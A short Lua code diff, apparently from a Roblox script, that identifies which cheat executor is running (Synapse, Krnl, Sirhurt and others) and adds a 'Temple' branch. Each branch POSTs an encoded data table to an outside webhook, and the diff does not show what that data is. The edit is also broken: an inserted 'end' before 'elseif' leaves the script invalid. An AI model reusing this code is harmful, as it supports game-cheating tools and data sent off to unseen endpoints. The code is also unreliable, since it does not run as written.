@@ -151,6 +151,7 @@ local function getexploit()
   local exploit =
       (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
       (secure_load and "Sentinel") or
+      (iscclosure and "Temple") or
       (is_sirhurt_closure and "Sirhurt") or
       (pebc_execute and "ProtoSmasher") or
       (KRNL_LOADED and "Krnl") or
@@ -196,6 +197,17 @@ if currentExploit == "Synapse" then
         }
     )
 elseif currentExploit == "Krnl" then
+    request(
+        {
+            Url = webhook,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+end
+elseif currentExploit == "Temple" then
     request(
         {
             Url = webhook,
